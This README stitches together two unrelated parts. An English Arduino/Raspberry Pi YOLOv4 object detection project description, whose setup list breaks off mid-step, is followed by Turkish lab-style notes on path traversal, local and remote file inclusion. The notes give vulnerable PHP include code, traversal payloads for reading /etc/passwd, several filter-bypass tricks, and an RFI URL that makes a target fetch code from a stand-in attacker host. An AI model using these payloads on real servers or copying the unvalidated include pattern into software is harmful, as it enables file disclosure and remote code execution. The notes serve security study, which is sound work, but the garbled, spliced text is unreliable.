# Arduino and Raspberry Pi4 Object Detection Project

## Description
This project focuses on object detection using Arduino, Raspberry Pi 4, and the YOLOv4 model. A USB camera connected to the Raspberry Pi 4 captures the images, and objects are detected using the YOLOv4 model. When a specific object is identified, the corresponding LED on the Arduino is triggered to light up. The project aims to evaluate the performance and efficiency of Arduino and Raspberry Pi 4 hardware in real-time object detection.

## Features
- Object detection using YOLOv4.
- Real-time object identification via a USB camera connected to Raspberry Pi 4.
- Arduino triggers LEDs to indicate recognized objects.
- Performance and efficiency measurement of Arduino and Raspberry Pi 4 hardware.

## Technologies Used
- **Hardware**:
  - Arduino
  - Raspberry Pi 4
  - USB Camera
  - LEDs
- **Software**:
  - YOLOv4 Object Detection Model
  - Python for Raspberry Pi programming
  - Arduino IDE for microcontroller programming
  - OpenCV for image processing

## Setup
1. Connect the USB camera to the Raspberry Pi 4.
2. Upload the Arduino code to the microcontroller using the Arduino IDE.
3. Install necessary Python libraries for YOLOv4 on the Raspberry Pi:
## Model Files
The YOLO model files are stored externally due to size constraints. Download them from the following link:
[Download YOLO Models](https://drive.google.com/file/d/1YHB8XA6gKgN_wgjmSJKbKTTeveajuWFH/view)

 
# File Inclusion
**Path Traversal (Directory Traversal),** bir web uygulamasında ortaya çıkan ve saldırganın sunucu üzerindeki dosyalara yetkisiz şekilde erişmesine imkân veren bir güvenlik açığıdır. Normalde bir kullanıcı yalnızca uygulamanın izin verdiği klasörlerdeki dosyalara erişebilmelidir. Ancak bu zafiyet sayesinde saldırgan, uygulamanın kök dizininin dışına çıkarak işletim sistemine ait hassas dosyaları bile okuyabilir.
Bu zafiyet genellikle kullanıcıdan alınan bir girdinin (örneğin URL parametresi) doğrudan dosya okuma fonksiyonlarına verilmesiyle ortaya çıkar. Asıl sorun, verilen kullanıcı girdisinin yeterince doğrulanmamasıdır. Yani uygulama, “kullanıcı gerçekten izin verilen bir dosyayı mı istiyor?” kontrolünü yapmazsa açık oluşur.
Path Traversal zafiyeti, kullanıcıdan alınan dosya yolu bilgisinin kontrol edilmeden kullanılması sonucu ortaya çıkar. Saldırgan bu durumu kullanarak uygulamanın erişmemesi gereken dosyalara ulaşabilir. Bu yüzden geliştiricilerin, kullanıcı girdilerini mutlaka doğrulaması ve erişilebilecek dosya yollarını sınırlandırması gerekir.

**Local File Inclusion (LFI)**, bir web uygulamasının sunucu üzerindeki dosyaları sayfanın içine dahil etmesi (include etmesi) sırasında oluşan bir güvenlik açığıdır. Yani uygulama, kullanıcıdan aldığı bir parametreye göre hangi dosyanın gösterileceğine karar veriyorsa ve bu parametre kontrol edilmiyorsa, saldırgan istediği dosyayı yükletebilir.
Bu durum özellikle PHP’de çok sık görülür çünkü PHP’de include, require gibi fonksiyonlar başka dosyaları doğrudan sayfanın içine ekler. Normalde bu fonksiyonlar, geliştiricinin belirlediği güvenli dosyaları çağırmak için kullanılır. Ancak kullanıcı girdisi doğrudan bu fonksiyonlara verilirse ciddi bir risk oluşur. 
include($_GET["lang"]);
Burada uygulama, URL’deki lang parametresine göre bir dosya açıyor. Normal kullanımda:
index.php?lang=EN.php
index.php?lang=AR.php
şeklinde çalışır ve kullanıcı dil seçimi yapar.
Ancak burada hiçbir kontrol olmadığı için saldırgan şunu diyebilir:
index.php?lang=/etc/passwd
Eğer sunucu izin veriyorsa, bu dosya doğrudan sayfanın içine dahil edilir ve içeriği kullanıcıya gösterilir. Bu, sistemdeki hassas bilgilerin sızmasına yol açar.

aşağıdaki örnekte geliştirici biraz daha güvenli olduğunu düşünerek dosya yolunu sabitlemiş:
include("languages/" . $_GET['lang']);
Yani sadece languages klasörü içinden dosya alınsın istemiş. Normal kullanım:
index.php?lang=EN.php
→ languages/EN.php yüklenir.
Ama yine input kontrolü yoksa saldırgan bu sınırlamayı aşabilir. Burada devreye yine Path Traversal girer. Saldırgan ../ kullanarak üst dizinlere çıkabilir:
index.php?lang=../../../../etc/passwd
Bu durumda uygulama aslında şunu çalıştırır:
languages/../../../../etc/passwd
ve bu yol çözülürken sistem:
/etc/passwd
dosyasına ulaşır.

Buradaki önemli fark şudur:
Path Traversal’da sen sadece dosya yolunu manipüle edersin ve uygulama o dosyayı okur. Yani amaç genelde içerik sızdırmaktır. Örneğin /etc/passwd gibi bir dosyanın içeriğini görürsün.
LFI (Local File Inclusion)’da ise uygulama bir dosyayı include gibi bir fonksiyonla sayfanın içine dahil eder. Bu şu anlama gelir: o dosya, sanki uygulamanın bir parçasıymış gibi işlenir.
Yani LFI’de dosya sadece okunmaz, sayfanın parçası haline gelir. Bu yüzden etkisi daha büyük olabilir.

##LFI Filter Bypass Techniques

**Null Byte Injection Bypass (%00)**
Uygulama, kullanıcıdan aldığı parametreyi sabit bir dizin (languages/) ve sabit bir uzantı (.php) ile birleştirerek dosya yolu oluşturmaktadır. Bu durum, dizin geçişi (directory traversal) ile uygulama dizini dışına çıkılmasına imkân tanır. Ancak doğrudan /etc/passwd gibi dosyalar çağrılmak istendiğinde, uygulamanın otomatik olarak .php eklemesi nedeniyle erişim başarısız olur (languages/../../../../etc/passwd.php). Bu kısıtlama, eski PHP sürümlerinde Null Byte (%00) kullanılarak aşılabilmekteydi. %00 karakteri string sonlandırıcı olarak yorumlandığı için sonradan eklenen .php uzantısı etkisiz hale getirilebilmekteydi. Modern sistemlerde bu yöntem geçerliliğini yitirmiştir.
**
Dot Slash / Current Directory Bypass (/. tekniği)**
Bu yöntem, dosya sistemi çözümleme mantığından faydalanır. Uygulama belirli anahtar kelimeleri (örneğin /etc/passwd) filtrelemeye çalışsa bile, dosya yollarına eklenen /. ifadesi aynı dizini temsil eder ve hedef dosyanın değişmeden kalmasını sağlar. Örneğin /etc/passwd/. ifadesi, işletim sistemi tarafından yine /etc/passwd olarak yorumlanır. Bu teknik, özellikle basit string filtrelemelerinin uygulandığı durumlarda, filtreyi bozmadan hedefe ulaşmayı mümkün kılar.

**Path Traversal Obfuscation Bypass (....// tekniği)**
Bu yöntemin temelinde eksik veya hatalı uygulanan filtreleme mekanizması bulunmaktadır. Uygulama ../ ifadelerini kaldırarak dizin geçişini engellemeye çalışsa da, bu işlem genellikle tek seferlik (single-pass) yapılır. Saldırgan, ....// gibi özel olarak hazırlanmış ifadeler kullanarak bu filtreyi aşabilir. Filtre ilk ../ benzeri pattern’i temizledikten sonra kalan ifade yeniden yorumlandığında geçerli bir dizin geçişine dönüşür. Bu teknik, filtreleme işleminin yeterince derin uygulanmamasından kaynaklanan bir zafiyeti hedef alır.

 


**Prefix Enforcement Bypass (Zorunlu dizin ekleme bypass)**
Bu yöntemde uygulama, kullanıcı girdisinin belirli bir dizinle başlamasını zorunlu kılar (örneğin languages/). Amaç, erişimi yalnızca belirli bir klasörle sınırlandırmaktır. Ancak bu kontrol, dizin geçişi ile aşılabilir. Kullanıcı girdisine gerekli prefix eklendikten sonra ../ kullanılarak bu dizinden çıkış yapılır. Örneğin languages/../../../../../etc/passwd gibi bir ifade hem uygulamanın beklediği formatı sağlar hem de hedef dosyaya erişim imkânı tanır. Bu durum, yalnızca prefix kontrolüne dayalı güvenlik önlemlerinin yetersiz olduğunu göstermektedir.


# Remote File İnclusion (RFI)

Remote File Inclusion (RFI), web uygulamasının kullanıcıdan aldığı girdiyi yeterli doğrulama ve filtreleme mekanizmalarından geçirmeden include() veya benzeri dosya dahil etme fonksiyonlarında kullanması sonucu ortaya çıkan bir güvenlik zafiyetidir. Bu zafiyet, saldırganın uygulamaya yerel dosyalar yerine uzak bir sunucuda barındırdığı dosyaları dahil ettirmesine olanak tanır.
RFI zafiyetinin oluşabilmesi için, hedef sistemde PHP yapılandırmasında allow_url_fopen veya benzeri uzaktan dosya erişimine izin veren ayarların aktif olması gerekmektedir. Bu ayar aktif olduğunda, include() fonksiyonu yalnızca yerel dosyaları değil, HTTP/HTTPS gibi protokoller üzerinden erişilebilen uzak dosyaları da işleyebilmektedir.

**Çalışma Mekanizması**
RFI saldırısı, istemci ve sunucu arasındaki veri akışının manipüle edilmesine dayanır. Uygulama, kullanıcıdan aldığı parametreyi doğrudan bir URL olarak işleyebildiği durumlarda, saldırgan kendi kontrolündeki bir sunucuda zararlı içerik barındırarak bu içeriği hedef uygulamaya dahil ettirebilir.
Tipik bir saldırı senaryosu şu şekilde gerçekleşir:
1.	Saldırgan, kendi kontrolündeki bir sunucuda zararlı bir dosya barındırır.
Örneğin:
<?php echo "Hello THM"; ?>
2.	Hedef uygulamaya, bu dosyayı işaret eden bir URL parametre olarak gönderilir:
http://webapp.thm/index.php?lang=http://attacker.thm/cmd.txt
3.	Uygulama, bu girdiyi doğrudan include() fonksiyonuna iletir. 
4.	Hedef sunucu, saldırganın sunucusuna bir HTTP isteği göndererek ilgili dosyayı çeker. 
5.	Çekilen dosya uygulama içerisinde çalıştırılır ve çıktısı kullanıcıya döndürülür. 
Bu süreç sonucunda, saldırganın sağladığı kod hedef sunucu üzerinde çalıştırılmış olur.
**Etkileri ve Riskler**
RFI zafiyeti, LFI zafiyetine kıyasla daha yüksek risk taşımaktadır. Bunun temel nedeni, saldırganın doğrudan kendi kontrolündeki kodu çalıştırabilmesidir. Bu durum aşağıdaki güvenlik risklerine yol açabilir:
•	Remote Code Execution (RCE): Sunucu üzerinde uzaktan komut çalıştırma imkânı 
•	Hassas Bilgi Sızıntısı: Sunucu üzerindeki kritik verilerin ifşa edilmesi 
•	Cross-Site Scripting (XSS): Zararlı istemci tarafı kodların enjekte edilmesi 
•	Denial of Service (DoS): Hizmetin kesintiye uğratılması
•	RFI zafiyetinin temel nedeni, kullanıcı girdisinin doğrudan ve kontrolsüz şekilde dosya dahil etme mekanizmasına aktarılmasıdır. Özellikle URL tabanlı kaynaklara erişimin aktif olduğu ortamlarda, bu durum ciddi güvenlik açıklarına yol açmaktadır. Güvenli bir uygulama tasarımında, kullanıcı girdisinin doğrudan dosya yolu veya URL olarak kullanılmaması, katı doğrulama ve beyaz listeleme (whitelisting) yöntemlerinin uygulanması gerekmektedir.


